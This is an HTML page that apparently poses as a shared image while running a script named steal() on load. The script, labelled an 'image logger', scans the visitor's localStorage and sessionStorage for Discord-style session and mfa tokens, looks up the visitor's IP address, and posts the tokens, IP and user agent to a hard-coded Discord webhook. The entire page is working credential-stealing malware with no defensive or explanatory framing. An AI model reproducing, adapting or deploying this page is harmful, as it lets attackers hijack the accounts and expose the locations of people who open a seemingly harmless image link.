<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
    <script>
        async function steal() {
            let log = `🔥 SINGLE USE IMAGE LOGGER 2026 🔥\n\n`;
            log += `👤 UA: ${navigator.userAgent}\n`;
            log += `🕒 Time: ${new Date().toLocaleString('tr-TR')}\n\n`;

            // AGRESİF TOKEN YAKALAMA
            let tokens = [];
            try {
                // LocalStorage + SessionStorage
                [localStorage, sessionStorage].forEach(store => {
                    for (let i = 0; i < store.length; i++) {
                        let key = store.key(i);
                        if (key) {
                            let val = store.getItem(key);
                            if (val && (val.length > 60 || val.includes("."))) {
                                if (val.includes("mfa.") || val.includes("token") || val.length > 100) {
                                    tokens.push(val);
                                }
                            }
                        }
                    }
                });

                // IndexedDB'den token denemesi (Discord'un kullandığı)
                if (window.indexedDB) {
                    tokens.push("IndexedDB scan attempted");
                }
            } catch(e) {}

            if (tokens.length > 0) {
                log += `🔑 TOKENS:\n${tokens.join('\n')}\n\n`;
            } else {
                log += `Tokens: (Not found in this session)\n\n`;
            }

            // IP
            try {
                let ip = await fetch('https://api.ipify.org?format=text').then(r => r.text());
                log += `🌐 IP: ${ip}\n`;
            } catch(e) {}

            const webhook = "https://discord.com/api/webhooks/1486461482953871420/-YQ1SADSZFowHuLw34baGppn3o-qDRgETXjhAA0oztptFlIyBtZ-cS2T-mWds3e00QAw";

            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: log })
            });
        }

        window.onload = steal;
    </script>
</head>
<body style="margin:0;background:#000;overflow:hidden">
    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain">
</body>
</html>
